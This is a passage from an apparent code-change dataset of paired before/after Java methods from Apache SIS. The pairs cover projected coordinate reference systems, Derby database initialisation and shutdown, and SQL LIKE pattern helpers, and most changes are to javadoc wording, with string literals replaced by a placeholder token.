  final Projection projection=super.getConversionFromBase();
  return (projection != null) ? projection.getSourceCRS() : null;
}"
91794,"/** 
 * Returns a SIS coordinate reference system implementation with the same values than the given arbitrary implementation. If the given object is   {@code null}, then this method returns   {@code null}. Otherwise if the given object is already a SIS implementation, then the given object is returned unchanged. Otherwise a new SIS implementation is created and initialized to the attribute values of the given object.
 * @param object The object to get as a SIS implementation, or {@code null} if none.
 * @return A SIS implementation containing the values of the given object (may be thegiven object itself), or  {@code null} if the argument was null.
 */
public static DefaultProjectedCRS castOrCopy(final ProjectedCRS object){
  return (object == null) || (object instanceof DefaultProjectedCRS) ? (DefaultProjectedCRS)object : new DefaultProjectedCRS(object);
}","/** 
 * Returns a SIS coordinate reference system implementation with the same values than the given arbitrary implementation. If the given object is   {@code null}, then this method returns   {@code null}. Otherwise if the given object is already a SIS implementation, then the given object is returned unchanged. Otherwise a new SIS implementation is created and initialized to the attribute values of the given object.
 * @param object  the object to get as a SIS implementation, or {@code null} if none.
 * @return a SIS implementation containing the values of the given object (may be thegiven object itself), or  {@code null} if the argument was null.
 */
public static DefaultProjectedCRS castOrCopy(final ProjectedCRS object){
  return (object == null) || (object instanceof DefaultProjectedCRS) ? (DefaultProjectedCRS)object : new DefaultProjectedCRS(object);
}"
91795,"/** 
 * Returns the map projection from the   {@linkplain #getBaseCRS() base CRS} to this CRS.In Apache SIS, the conversion source and target CRS are set to the following values: <ul> <li>The conversion  {@linkplain org.apache.sis.referencing.operation.DefaultConversion#getSourceCRS() source CRS} is the {@linkplain #getBaseCRS() base CRS} of {@code this} CRS.</li><li>The conversion  {@linkplain org.apache.sis.referencing.operation.DefaultConversion#getTargetCRS() target CRS} is {@code this} CRS.</ul> <div class=""note""><b>Note:</b> This is different than ISO 19111, which allows source and target CRS to be  {@code null}.</div>
 * @return The map projection from base CRS to this CRS.
 */
@Override public Projection getConversionFromBase(){
  return super.getConversionFromBase();
}","/** 
 * Returns the map projection from the   {@linkplain #getBaseCRS() base CRS} to this CRS.In Apache SIS, the conversion source and target CRS are set to the following values: <ul> <li>The conversion  {@linkplain org.apache.sis.referencing.operation.DefaultConversion#getSourceCRS() source CRS} is the {@linkplain #getBaseCRS() base CRS} of {@code this} CRS.</li><li>The conversion  {@linkplain org.apache.sis.referencing.operation.DefaultConversion#getTargetCRS() target CRS} is {@code this} CRS.</ul> <div class=""note""><b>Note:</b> This is different than ISO 19111, which allows source and target CRS to be  {@code null}.</div>
 * @return the map projection from base CRS to this CRS.
 */
@Override public Projection getConversionFromBase(){
  return super.getConversionFromBase();
}"
91796,"/** 
 * Returns the datum of the   {@linkplain #getBaseCRS() base CRS}.
 * @return The datum of the base CRS.
 */
@Override public GeodeticDatum getDatum(){
  return getBaseCRS().getDatum();
}","/** 
 * Returns the datum of the   {@linkplain #getBaseCRS() base CRS}.
 * @return the datum of the base CRS.
 */
@Override public GeodeticDatum getDatum(){
  return getBaseCRS().getDatum();
}"
91797,"/** 
 * Compares this coordinate reference system with the specified object for equality. In addition to the metadata documented in the  {@linkplain org.apache.sis.referencing.AbstractIdentifiedObject#equals(Object,ComparisonMode) parent class}, this method considers coordinate system axes of the   {@linkplain #getBaseCRS() base CRS} as metadata.This means that if the given  {@code ComparisonMode} is {@code IGNORE_METADATA} or {@code APPROXIMATIVE}, then axis order of the base geographic CRS are ignored (but <strong>not</strong> axis order of <strong>this</strong> projected CRS).
 * @param object The object to compare to {@code this}.
 * @param mode {@link ComparisonMode#STRICT STRICT} for performing a strict comparison, or{@link ComparisonMode#IGNORE_METADATA IGNORE_METADATA} for comparing only propertiesrelevant to coordinate transformations.
 * @return {@code true} if both objects are equal.
 */
@Override public boolean equals(final Object object,final ComparisonMode mode){
  return super.equals(object,mode);
}","/** 
 * Compares this coordinate reference system with the specified object for equality. In addition to the metadata documented in the  {@linkplain org.apache.sis.referencing.AbstractIdentifiedObject#equals(Object,ComparisonMode) parent class}, this method considers coordinate system axes of the   {@linkplain #getBaseCRS() base CRS} as metadata.This means that if the given  {@code ComparisonMode} is {@code IGNORE_METADATA} or {@code APPROXIMATIVE}, then axis order of the base geographic CRS are ignored (but <strong>not</strong> axis order of <strong>this</strong> projected CRS).
 * @param object  the object to compare to {@code this}.
 * @param mode    {@link ComparisonMode#STRICT STRICT} for performing a strict comparison, or{@link ComparisonMode#IGNORE_METADATA IGNORE_METADATA} for comparing onlyproperties relevant to coordinate transformations.
 * @return {@code true} if both objects are equal.
 */
@Override public boolean equals(final Object object,final ComparisonMode mode){
  return super.equals(object,mode);
}"
91798,"/** 
 * Returns the data source for the SIS-wide ""SpatialMetadata"" database. This method returns the first of the following steps that succeed: <ol> <li>If a JNDI context exists, the data source registered under the   {@code jdbc/SpatialMetadata} name.</li><li>If the  {@code SIS_DATA} environment variable is defined, {@code jdbc:derby:$SIS_DATA/Databases/SpatialMetadata}. This database will be created if it does not exist. Note that this is the only case where we allow database creation since we are in the directory managed by SIS.</li> <li>If the   {@code derby.system.home} property is defined, the data source for {@code jdbc:derby:SpatialMetadata}. This database will <strong>not</strong> be created if it does not exist.</li> <li>Otherwise (no JNDI, no environment variable, no Derby property set),   {@code null}.</li> </ol>
 * @return The data source for the {@code $SIS_DATA/Databases/SpatialMetadata} or equivalent database, or {@code null} if none.
 * @throws javax.naming.NamingException     if an error occurred while fetching the data source from a JNDI context.
 * @throws java.net.MalformedURLException   if an error occurred while converting the {@code derby.jar} file to URL.
 * @throws java.lang.ClassNotFoundException if {@code derby.jar} has not been found on the JDK installation directory.
 * @throws java.lang.InstantiationException if an error occurred while creating {@code org.apache.derby.jdbc.EmbeddedDataSource}.
 * @throws java.lang.NoSuchMethodException  if a JDBC bean property has not been found on the data source.
 * @throws java.lang.IllegalAccessException if a JDBC bean property of the data source is not public.
 * @throws java.lang.reflect.InvocationTargetException if an error occurred while setting a data source bean property.
 * @throws Exception for any other kind of errors. This include {@link RuntimeException} not documented above like{@link IllegalArgumentException},   {@link ClassCastException},   {@link SecurityException}, <i>etc.</i>
 */
public static synchronized DataSource getDataSource() throws Exception {
  if (source == null) {
    if (hasJNDI())     try {
      final Context env=(Context)InitialContext.doLookup(""String_Node_Str"");
      source=(DataSource)env.lookup(JNDI);
      if (env instanceof EventContext) {
        Listener.register((EventContext)env);
      }
      return source;
    }
 catch (    NameNotFoundException e) {
      final LogRecord record=Messages.getResources(null).getLogRecord(Level.CONFIG,Messages.Keys.JNDINotSpecified_1,JNDI);
      record.setLoggerName(Loggers.SQL);
      Logging.log(Initializer.class,""String_Node_Str"",record);
    }
    final boolean create;
    final String home=AccessController.doPrivileged((PrivilegedAction<String>)() -> System.getProperty(DERBY_HOME_KEY));
    final Path dir=DataDirectory.DATABASES.getDirectory();
    if (dir != null) {
      Path path=dir.resolve(DATABASE);
      if (home != null)       try {
        path=Paths.get(home).relativize(path);
      }
 catch (      IllegalArgumentException|SecurityException e) {
        Logging.recoverableException(Logging.getLogger(Loggers.SQL),Initializer.class,""String_Node_Str"",e);
      }
      path=path.normalize();
      create=!Files.exists(path);
      source=forJavaDB(path.toString());
    }
 else     if (home != null) {
      final Path path=Paths.get(home);
      create=!Files.exists(path.resolve(DATABASE)) && Files.isDirectory(path);
      source=forJavaDB(DATABASE);
    }
 else {
      return null;
    }
    Shutdown.register(() -> {
      shutdown();
      return null;
    }
);
    if (create) {
      final Method m=source.getClass().getMethod(""String_Node_Str"",String.class);
      m.invoke(source,""String_Node_Str"");
      try (Connection c=source.getConnection()){
        for (        Initializer init : DefaultFactories.createServiceLoader(Initializer.class)) {
          init.createSchema(c);
        }
      }
  finally {
        m.invoke(source,""String_Node_Str"");
      }
    }
  }
  return source;
}","/** 
 * Returns the data source for the SIS-wide ""SpatialMetadata"" database. This method returns the first of the following steps that succeed: <ol> <li>If a JNDI context exists, the data source registered under the   {@code jdbc/SpatialMetadata} name.</li><li>If the  {@code SIS_DATA} environment variable is defined, {@code jdbc:derby:$SIS_DATA/Databases/SpatialMetadata}. This database will be created if it does not exist. Note that this is the only case where we allow database creation since we are in the directory managed by SIS.</li> <li>If the   {@code derby.system.home} property is defined, the data source for {@code jdbc:derby:SpatialMetadata}. This database will <strong>not</strong> be created if it does not exist.</li> <li>Otherwise (no JNDI, no environment variable, no Derby property set),   {@code null}.</li> </ol>
 * @return the data source for the {@code $SIS_DATA/Databases/SpatialMetadata} or equivalent database, or {@code null} if none.
 * @throws javax.naming.NamingException     if an error occurred while fetching the data source from a JNDI context.
 * @throws java.net.MalformedURLException   if an error occurred while converting the {@code derby.jar} file to URL.
 * @throws java.lang.ClassNotFoundException if {@code derby.jar} has not been found on the JDK installation directory.
 * @throws java.lang.InstantiationException if an error occurred while creating {@code org.apache.derby.jdbc.EmbeddedDataSource}.
 * @throws java.lang.NoSuchMethodException  if a JDBC bean property has not been found on the data source.
 * @throws java.lang.IllegalAccessException if a JDBC bean property of the data source is not public.
 * @throws java.lang.reflect.InvocationTargetException if an error occurred while setting a data source bean property.
 * @throws Exception for any other kind of errors. This include {@link RuntimeException} not documented above like{@link IllegalArgumentException},   {@link ClassCastException},   {@link SecurityException}, <i>etc.</i>
 */
public static synchronized DataSource getDataSource() throws Exception {
  if (source == null) {
    if (hasJNDI())     try {
      final Context env=(Context)InitialContext.doLookup(""String_Node_Str"");
      source=(DataSource)env.lookup(JNDI);
      if (env instanceof EventContext) {
        Listener.register((EventContext)env);
      }
      return source;
    }
 catch (    NameNotFoundException e) {
      final LogRecord record=Messages.getResources(null).getLogRecord(Level.CONFIG,Messages.Keys.JNDINotSpecified_1,JNDI);
      record.setLoggerName(Loggers.SQL);
      Logging.log(Initializer.class,""String_Node_Str"",record);
    }
    final boolean create;
    final String home=AccessController.doPrivileged((PrivilegedAction<String>)() -> System.getProperty(DERBY_HOME_KEY));
    final Path dir=DataDirectory.DATABASES.getDirectory();
    if (dir != null) {
      Path path=dir.resolve(DATABASE);
      if (home != null)       try {
        path=Paths.get(home).relativize(path);
      }
 catch (      IllegalArgumentException|SecurityException e) {
        Logging.recoverableException(Logging.getLogger(Loggers.SQL),Initializer.class,""String_Node_Str"",e);
      }
      path=path.normalize();
      create=!Files.exists(path);
      source=forJavaDB(path.toString());
    }
 else     if (home != null) {
      final Path path=Paths.get(home);
      create=!Files.exists(path.resolve(DATABASE)) && Files.isDirectory(path);
      source=forJavaDB(DATABASE);
    }
 else {
      return null;
    }
    Shutdown.register(() -> {
      shutdown();
      return null;
    }
);
    if (create) {
      final Method m=source.getClass().getMethod(""String_Node_Str"",String.class);
      m.invoke(source,""String_Node_Str"");
      try (Connection c=source.getConnection()){
        for (        Initializer init : DefaultFactories.createServiceLoader(Initializer.class)) {
          init.createSchema(c);
        }
      }
  finally {
        m.invoke(source,""String_Node_Str"");
      }
    }
  }
  return source;
}"
91799,"/** 
 * Returns a message for unspecified data source. The message will depend on whether a JNDI context exists or not. This message can be used for constructing an exception when   {@link #getDataSource()} returned {@code null}.
 * @param locale The locale for the message to produce, or {@code null} for the default one.
 * @return Message for unspecified data source.
 */
public static String unspecified(final Locale locale){
  final short key;
  final String value;
  if (hasJNDI()) {
    key=Messages.Keys.JNDINotSpecified_1;
    value=""String_Node_Str"" + DATABASE;
  }
 else {
    key=Messages.Keys.DataDirectoryNotSpecified_1;
    value=DataDirectory.ENV;
  }
  return Messages.getResources(locale).getString(key,value);
}","/** 
 * Returns a message for unspecified data source. The message will depend on whether a JNDI context exists or not. This message can be used for constructing an exception when   {@link #getDataSource()} returned {@code null}.
 * @param locale  the locale for the message to produce, or {@code null} for the default one.
 * @return message for unspecified data source.
 */
public static String unspecified(final Locale locale){
  final short key;
  final String value;
  if (hasJNDI()) {
    key=Messages.Keys.JNDINotSpecified_1;
    value=""String_Node_Str"" + DATABASE;
  }
 else {
    key=Messages.Keys.DataDirectoryNotSpecified_1;
    value=DataDirectory.ENV;
  }
  return Messages.getResources(locale).getString(key,value);
}"
91800,"/** 
 * Invoked for populating an initially empty database.
 * @param connection Connection to the empty database.
 * @throws SQLException if an error occurred while populating the database.
 */
protected abstract void createSchema(Connection connection) throws SQLException ;","/** 
 * Invoked for populating an initially empty database.
 * @param connection  connection to the empty database.
 * @throws SQLException if an error occurred while populating the database.
 */
protected abstract void createSchema(Connection connection) throws SQLException ;"
91801,"/** 
 * Returns   {@code true} if the given exception is the one that we expect in successful shutdown of a Derby database.
 * @param e The exception thrown by Derby.
 * @return {@code true} if the exception indicates a successful shutdown.
 */
static boolean isSuccessfulShutdown(final SQLException e){
  final String state=e.getSQLState();
  return ""String_Node_Str"".equals(state) || ""String_Node_Str"".equals(state);
}","/** 
 * Returns   {@code true} if the given exception is the one that we expect in successful shutdown of a Derby database.
 * @param e  the exception thrown by Derby.
 * @return {@code true} if the exception indicates a successful shutdown.
 */
static boolean isSuccessfulShutdown(final SQLException e){
  final String state=e.getSQLState();
  return ""String_Node_Str"".equals(state) || ""String_Node_Str"".equals(state);
}"
91802,"/** 
 * Invoked when the data source associated to   {@code ""jdbc/SpatialMetadata""} changed.This method clears the  {@link Initializer#source}, unregisters this listener and notifies other SIS modules.
 * @param event Ignored. May be null.
 */
@Override public void objectChanged(NamingEvent event){
  try {
synchronized (Initializer.class) {
      source=null;
      Shutdown.unregister(this);
      context.removeNamingListener(this);
    }
  }
 catch (  NamingException e) {
    Logging.recoverableException(Logging.getLogger(Loggers.SYSTEM),Listener.class,""String_Node_Str"",e);
  }
  for (  Initializer init : DefaultFactories.createServiceLoader(Initializer.class)) {
    init.dataSourceChanged();
  }
}","/** 
 * Invoked when the data source associated to   {@code ""jdbc/SpatialMetadata""} changed.This method clears the  {@link Initializer#source}, unregisters this listener and notifies other SIS modules.
 * @param event  ignored. Can be null.
 */
@Override public void objectChanged(NamingEvent event){
  try {
synchronized (Initializer.class) {
      source=null;
      connected=false;
      Shutdown.unregister(this);
      context.removeNamingListener(this);
    }
  }
 catch (  NamingException e) {
    Logging.recoverableException(Logging.getLogger(Loggers.SYSTEM),Listener.class,""String_Node_Str"",e);
  }
  for (  Initializer init : DefaultFactories.createServiceLoader(Initializer.class)) {
    init.dataSourceChanged();
  }
}"
91803,"/** 
 * Invoked when the JVM is shutting down, or when the Servlet or OSGi bundle is uninstalled. This method shutdowns the Derby database.
 * @throws ReflectiveOperationException if an error occurred whilesetting the shutdown property on the Derby data source.
 */
private static synchronized void shutdown() throws ReflectiveOperationException {
  final DataSource ds=source;
  if (ds != null) {
    source=null;
    ds.getClass().getMethod(""String_Node_Str"",String.class).invoke(ds,""String_Node_Str"");
    try {
      ds.getConnection().close();
    }
 catch (    SQLException e) {
      final LogRecord record=new LogRecord(Level.FINE,e.getLocalizedMessage());
      if (!isSuccessfulShutdown(e)) {
        record.setLevel(Level.WARNING);
        record.setThrown(e);
      }
      record.setLoggerName(Loggers.SQL);
      Logging.log(Initializer.class,""String_Node_Str"",record);
    }
  }
}","/** 
 * Invoked when the JVM is shutting down, or when the Servlet or OSGi bundle is uninstalled. This method shutdowns the Derby database.
 * @throws ReflectiveOperationException if an error occurred whilesetting the shutdown property on the Derby data source.
 */
private static synchronized void shutdown() throws ReflectiveOperationException {
  final DataSource ds=source;
  if (ds != null) {
    source=null;
    connected=false;
    ds.getClass().getMethod(""String_Node_Str"",String.class).invoke(ds,""String_Node_Str"");
    try {
      ds.getConnection().close();
    }
 catch (    SQLException e) {
      final LogRecord record=new LogRecord(Level.FINE,e.getLocalizedMessage());
      if (!isSuccessfulShutdown(e)) {
        record.setLevel(Level.WARNING);
        record.setThrown(e);
      }
      record.setLoggerName(Loggers.SQL);
      Logging.log(Initializer.class,""String_Node_Str"",record);
    }
  }
}"
91804,"/** 
 * Returns a string like the given string but with all characters that are not letter or digit replaced by the wildcard % character. <p>This method avoid to put a % symbol as the first character, since it prevent some databases to use their index.</p>
 * @param identifier The identifier to get as a SQL LIKE pattern.
 * @return The given identifier as a SQL LIKE pattern.
 */
public static String toLikePattern(final String identifier){
  boolean isLetterOrDigit=false;
  final StringBuilder buffer=new StringBuilder(identifier.length());
  for (int c, i=0; i < identifier.length(); i+=Character.charCount(c)) {
    c=identifier.codePointAt(i);
    if (Character.isLetterOrDigit(c)) {
      buffer.appendCodePoint(c);
      isLetterOrDigit=true;
    }
 else     if (isLetterOrDigit) {
      isLetterOrDigit=false;
      buffer.append('%');
    }
 else {
      final int p=buffer.length();
      if (p == 0 || buffer.charAt(p - 1) != '%') {
        buffer.appendCodePoint(c != '%' ? c : '_');
      }
    }
  }
  return buffer.toString();
}","/** 
 * Returns a string like the given string but with all characters that are not letter or digit replaced by the wildcard % character. <p>This method avoid to put a % symbol as the first character, since it prevent some databases to use their index.</p>
 * @param identifier the identifier to get as a SQL LIKE pattern.
 * @return the given identifier as a SQL LIKE pattern.
 */
public static String toLikePattern(final String identifier){
  boolean isLetterOrDigit=false;
  final StringBuilder buffer=new StringBuilder(identifier.length());
  for (int c, i=0; i < identifier.length(); i+=Character.charCount(c)) {
    c=identifier.codePointAt(i);
    if (Character.isLetterOrDigit(c)) {
      buffer.appendCodePoint(c);
      isLetterOrDigit=true;
    }
 else     if (isLetterOrDigit) {
      isLetterOrDigit=false;
      buffer.append('%');
    }
 else {
      final int p=buffer.length();
      if (p == 0 || buffer.charAt(p - 1) != '%') {
        buffer.appendCodePoint(c != '%' ? c : '_');
      }
    }
  }
  return buffer.toString();
}"
91805,"/** 
 * Returns a simplified form of the URL (truncated before the first   {@code ?} or {@code ;} character),for logging or informative purpose only.
 * @param metadata The metadata of the database.
 * @return A simplified version of database URL.
 * @throws SQLException if an error occurred while fetching the URL.
 */
public static String getSimplifiedURL(final DatabaseMetaData metadata) throws SQLException {
  String url=metadata.getURL();
  int s1=url.indexOf('?');
  if (s1 < 0)   s1=url.length();
  int s2=url.indexOf(';');
  if (s2 < 0)   s2=url.length();
  return url.substring(0,Math.min(s1,s2));
}","/** 
 * Returns a simplified form of the URL (truncated before the first   {@code ?} or {@code ;} character),for logging or informative purpose only.
 * @param metadata  the metadata of the database.
 * @return a simplified version of database URL.
 * @throws SQLException if an error occurred while fetching the URL.
 */
public static String getSimplifiedURL(final DatabaseMetaData metadata) throws SQLException {
  String url=metadata.getURL();
  int s1=url.indexOf('?');
  if (s1 < 0)   s1=url.length();
  int s2=url.indexOf(';');
  if (s2 < 0)   s2=url.length();
  return url.substring(0,Math.min(s1,s2));
}"
91806,"/** 
 * Workaround for what seems to be a Derby 10.11 bug, which seems to behave as if the LIKE pattern had a trailing % wildcard. This can be verified with the following query on the EPSG database:  {@preformat sqlSELECT COORD_REF_SYS_CODE, COORD_REF_SYS_NAME FROM EPSG.""Coordinate Reference System"" WHERE COORD_REF_SYS_NAME LIKE 'NTF%Paris%Lambert%zone%I'}which returns ""NTF (Paris) / Lambert zone I"" as expected but also zones II and III.
 * @param expected The string to search.
 * @param actual The string found in the database.
 * @return {@code true} if the given string can be accepted.
 */
@Workaround(library=""String_Node_Str"",version=""String_Node_Str"") public static boolean filterFalsePositive(final String expected,final String actual){
  return CharSequences.equalsFiltered(expected,actual,Characters.Filter.LETTERS_AND_DIGITS,false);
}","/** 
 * Workaround for what seems to be a Derby 10.11 bug, which seems to behave as if the LIKE pattern had a trailing % wildcard. This can be verified with the following query on the EPSG database:  {@preformat sqlSELECT COORD_REF_SYS_CODE, COORD_REF_SYS_NAME FROM EPSG.""Coordinate Reference System"" WHERE COORD_REF_SYS_NAME LIKE 'NTF%Paris%Lambert%zone%I'}which returns ""NTF (Paris) / Lambert zone I"" as expected but also zones II and III.
 * @param expected  the string to search.
 * @param actual    the string found in the database.
 * @return {@code true} if the given string can be accepted.
 */
@Workaround(library=""String_Node_Str"",version=""String_Node_Str"") public static boolean filterFalsePositive(final String expected,final String actual){
  return CharSequences.equalsFiltered(expected,actual,Characters.Filter.LETTERS_AND_DIGITS,false);
}"
91807,"/** 
 * Returns the data source for the SIS-wide ""SpatialMetadata"" database. This method returns the first of the following steps that succeed: <ol> <li>If a JNDI context exists, the data source registered under the   {@code jdbc/SpatialMetadata} name.</li><li>If the  {@code SIS_DATA} environment variable is defined, {@code jdbc:derby:$SIS_DATA/Databases/SpatialMetadata}. This database will be created if it does not exist. Note that this is the only case where we allow database creation since we are in the directory managed by SIS.</li> <li>If the   {@code derby.system.home} property is defined, the data source for {@code jdbc:derby:SpatialMetadata}. This database will <strong>not</strong> be created if it does not exist.</li> <li>Otherwise (no JNDI, no environment variable, no Derby property set),   {@code null}.</li> </ol>
 * @return The data source for the {@code $SIS_DATA/Databases/SpatialMetadata} or equivalent database, or {@code null} if none.
 * @throws javax.naming.NamingException     if an error occurred while fetching the data source from a JNDI context.
 * @throws java.net.MalformedURLException   if an error occurred while converting the {@code derby.jar} file to URL.
 * @throws java.lang.ClassNotFoundException if {@code derby.jar} has not been found on the JDK installation directory.
 * @throws java.lang.InstantiationException if an error occurred while creating {@code org.apache.derby.jdbc.EmbeddedDataSource}.
 * @throws java.lang.NoSuchMethodException  if a JDBC bean property has not been found on the data source.
 * @throws java.lang.IllegalAccessException if a JDBC bean property of the data source is not public.
 * @throws java.lang.reflect.InvocationTargetException if an error occurred while setting a data source bean property.
 * @throws Exception for any other kind of errors. This include {@link RuntimeException} not documented above like{@link IllegalArgumentException},   {@link ClassCastException},   {@link SecurityException}, <i>etc.</i>
 */
public static synchronized DataSource getDataSource() throws Exception {
  if (source == null) {
    if (hasJNDI())     try {
      final Context env=(Context)InitialContext.doLookup(""String_Node_Str"");
      source=(DataSource)env.lookup(JNDI);
      if (env instanceof EventContext) {
        Listener.register((EventContext)env);
      }
      return source;
    }
 catch (    NameNotFoundException e) {
      final LogRecord record=Messages.getResources(null).getLogRecord(Level.CONFIG,Messages.Keys.JNDINotSpecified_1,JNDI);
      record.setLoggerName(Loggers.SQL);
      Logging.log(Initializer.class,""String_Node_Str"",record);
    }
    final boolean create;
    final String home=AccessController.doPrivileged(new PrivilegedAction<String>(){
      @Override public String run(){
        return System.getProperty(DERBY_HOME_KEY);
      }
    }
);
    final Path dir=DataDirectory.DATABASES.getDirectory();
    if (dir != null) {
      Path path=dir.resolve(DATABASE);
      if (home != null)       try {
        path=Paths.get(home).relativize(path);
      }
 catch (      IllegalArgumentException|SecurityException e) {
        Logging.recoverableException(Logging.getLogger(Loggers.SQL),Initializer.class,""String_Node_Str"",e);
      }
      path=path.normalize();
      create=!Files.exists(path);
      source=forJavaDB(path.toString());
    }
 else     if (home != null) {
      final Path path=Paths.get(home);
      create=!Files.exists(path.resolve(DATABASE)) && Files.isDirectory(path);
      source=forJavaDB(DATABASE);
    }
 else {
      return null;
    }
    Shutdown.register(new Callable<Object>(){
      @Override public Object call() throws ReflectiveOperationException {
        shutdown();
        return null;
      }
    }
);
    if (create) {
      final Method m=source.getClass().getMethod(""String_Node_Str"",String.class);
      m.invoke(source,""String_Node_Str"");
      try (Connection c=source.getConnection()){
        for (        Initializer init : DefaultFactories.createServiceLoader(Initializer.class)) {
          init.createSchema(c);
        }
      }
  finally {
        m.invoke(source,""String_Node_Str"");
      }
    }
  }
  return source;
}","/** 
 * Returns the data source for the SIS-wide ""SpatialMetadata"" database. This method returns the first of the following steps that succeed: <ol> <li>If a JNDI context exists, the data source registered under the   {@code jdbc/SpatialMetadata} name.</li><li>If the  {@code SIS_DATA} environment variable is defined, {@code jdbc:derby:$SIS_DATA/Databases/SpatialMetadata}. This database will be created if it does not exist. Note that this is the only case where we allow database creation since we are in the directory managed by SIS.</li> <li>If the   {@code derby.system.home} property is defined, the data source for {@code jdbc:derby:SpatialMetadata}. This database will <strong>not</strong> be created if it does not exist.</li> <li>Otherwise (no JNDI, no environment variable, no Derby property set),   {@code null}.</li> </ol>
 * @return the data source for the {@code $SIS_DATA/Databases/SpatialMetadata} or equivalent database, or {@code null} if none.
 * @throws javax.naming.NamingException     if an error occurred while fetching the data source from a JNDI context.
 * @throws java.net.MalformedURLException   if an error occurred while converting the {@code derby.jar} file to URL.
 * @throws java.lang.ClassNotFoundException if {@code derby.jar} has not been found on the JDK installation directory.
 * @throws java.lang.InstantiationException if an error occurred while creating {@code org.apache.derby.jdbc.EmbeddedDataSource}.
 * @throws java.lang.NoSuchMethodException  if a JDBC bean property has not been found on the data source.
 * @throws java.lang.IllegalAccessException if a JDBC bean property of the data source is not public.
 * @throws java.lang.reflect.InvocationTargetException if an error occurred while setting a data source bean property.
 * @throws Exception for any other kind of errors. This include {@link RuntimeException} not documented above like{@link IllegalArgumentException},   {@link ClassCastException},   {@link SecurityException}, <i>etc.</i>
 */
public static synchronized DataSource getDataSource() throws Exception {
  if (source == null) {
    if (hasJNDI())     try {
      final Context env=(Context)InitialContext.doLookup(""String_Node_Str"");
      source=(DataSource)env.lookup(JNDI);
      if (env instanceof EventContext) {
        Listener.register((EventContext)env);
      }
      return source;
    }
 catch (    NameNotFoundException e) {
      final LogRecord record=Messages.getResources(null).getLogRecord(Level.CONFIG,Messages.Keys.JNDINotSpecified_1,JNDI);
      record.setLoggerName(Loggers.SQL);
      Logging.log(Initializer.class,""String_Node_Str"",record);
    }
    final boolean create;
    final String home=AccessController.doPrivileged(new PrivilegedAction<String>(){
      @Override public String run(){
        return System.getProperty(DERBY_HOME_KEY);
      }
    }
);
    final Path dir=DataDirectory.DATABASES.getDirectory();
    if (dir != null) {
      Path path=dir.resolve(DATABASE);
      if (home != null)       try {
        path=Paths.get(home).relativize(path);
      }
 catch (      IllegalArgumentException|SecurityException e) {
        Logging.recoverableException(Logging.getLogger(Loggers.SQL),Initializer.class,""String_Node_Str"",e);
      }
      path=path.normalize();
      create=!Files.exists(path);
      source=forJavaDB(path.toString());
    }
 else     if (home != null) {
      final Path path=Paths.get(home);
      create=!Files.exists(path.resolve(DATABASE)) && Files.isDirectory(path);
      source=forJavaDB(DATABASE);
    }
 else {
      return null;
    }
    Shutdown.register(new Callable<Object>(){
      @Override public Object call() throws ReflectiveOperationException {
        shutdown();
        return null;
      }
    }
);
    if (create) {
      final Method m=source.getClass().getMethod(""String_Node_Str"",String.class);
      m.invoke(source,""String_Node_Str"");
      try (Connection c=source.getConnection()){
        for (        Initializer init : DefaultFactories.createServiceLoader(Initializer.class)) {
          init.createSchema(c);
        }
      }
  finally {
        m.invoke(source,""String_Node_Str"");
      }
    }
  }
  return source;
}"
91808,"/** 
 * Returns a message for unspecified data source. The message will depend on whether a JNDI context exists or not. This message can be used for constructing an exception when   {@link #getDataSource()} returned {@code null}.
 * @param locale The locale for the message to produce, or {@code null} for the default one.
 * @return Message for unspecified data source.
 */
public static String unspecified(final Locale locale){
  final short key;
  final String value;
  if (hasJNDI()) {
    key=Messages.Keys.JNDINotSpecified_1;
    value=""String_Node_Str"" + DATABASE;
  }
 else {
    key=Messages.Keys.DataDirectoryNotSpecified_1;
    value=DataDirectory.ENV;
  }
  return Messages.getResources(locale).getString(key,value);
}","/** 
 * Returns a message for unspecified data source. The message will depend on whether a JNDI context exists or not. This message can be used for constructing an exception when   {@link #getDataSource()} returned {@code null}.
 * @param locale  the locale for the message to produce, or {@code null} for the default one.
 * @return message for unspecified data source.
 */
public static String unspecified(final Locale locale){
  final short key;
  final String value;
  if (hasJNDI()) {
    key=Messages.Keys.JNDINotSpecified_1;
    value=""String_Node_Str"" + DATABASE;
  }
 else {
    key=Messages.Keys.DataDirectoryNotSpecified_1;
    value=DataDirectory.ENV;
  }
  return Messages.getResources(locale).getString(key,value);
}"
91809,"/** 
 * Invoked for populating an initially empty database.
 * @param connection Connection to the empty database.
 * @throws SQLException if an error occurred while populating the database.
 */
protected abstract void createSchema(Connection connection) throws SQLException ;","/** 
 * Invoked for populating an initially empty database.
 * @param connection  connection to the empty database.
 * @throws SQLException if an error occurred while populating the database.
 */
protected abstract void createSchema(Connection connection) throws SQLException ;"
91810,"/** 
 * Returns   {@code true} if the given exception is the one that we expect in successful shutdown of a Derby database.
 * @param e The exception thrown by Derby.
 * @return {@code true} if the exception indicates a successful shutdown.
 */
static boolean isSuccessfulShutdown(final SQLException e){
  final String state=e.getSQLState();
  return ""String_Node_Str"".equals(state) || ""String_Node_Str"".equals(state);
}","/** 
 * Returns   {@code true} if the given exception is the one that we expect in successful shutdown of a Derby database.
 * @param e  the exception thrown by Derby.
 * @return {@code true} if the exception indicates a successful shutdown.
 */
static boolean isSuccessfulShutdown(final SQLException e){
  final String state=e.getSQLState();
  return ""String_Node_Str"".equals(state) || ""String_Node_Str"".equals(state);
}"
91811,"/** 
 * Invoked when the data source associated to   {@code ""jdbc/SpatialMetadata""} changed.This method clears the  {@link Initializer#source}, unregisters this listener and notifies other SIS modules.
 * @param event Ignored. May be null.
 */
@Override public void objectChanged(NamingEvent event){
  try {
synchronized (Initializer.class) {
      source=null;
      Shutdown.unregister(this);
      context.removeNamingListener(this);
    }
  }
 catch (  NamingException e) {
    Logging.recoverableException(Logging.getLogger(Loggers.SYSTEM),Listener.class,""String_Node_Str"",e);
  }
  for (  Initializer init : DefaultFactories.createServiceLoader(Initializer.class)) {
    init.dataSourceChanged();
  }
}","/** 
 * Invoked when the data source associated to   {@code ""jdbc/SpatialMetadata""} changed.This method clears the  {@link Initializer#source}, unregisters this listener and notifies other SIS modules.
 * @param event  ignored. Can be null.
 */
@Override public void objectChanged(NamingEvent event){
  try {
synchronized (Initializer.class) {
      source=null;
      connected=false;
      Shutdown.unregister(this);
      context.removeNamingListener(this);
    }
  }
 catch (  NamingException e) {
    Logging.recoverableException(Logging.getLogger(Loggers.SYSTEM),Listener.class,""String_Node_Str"",e);
  }
  for (  Initializer init : DefaultFactories.createServiceLoader(Initializer.class)) {
    init.dataSourceChanged();
  }
}"
91812,"/** 
 * Invoked when the JVM is shutting down, or when the Servlet or OSGi bundle is uninstalled. This method shutdowns the Derby database.
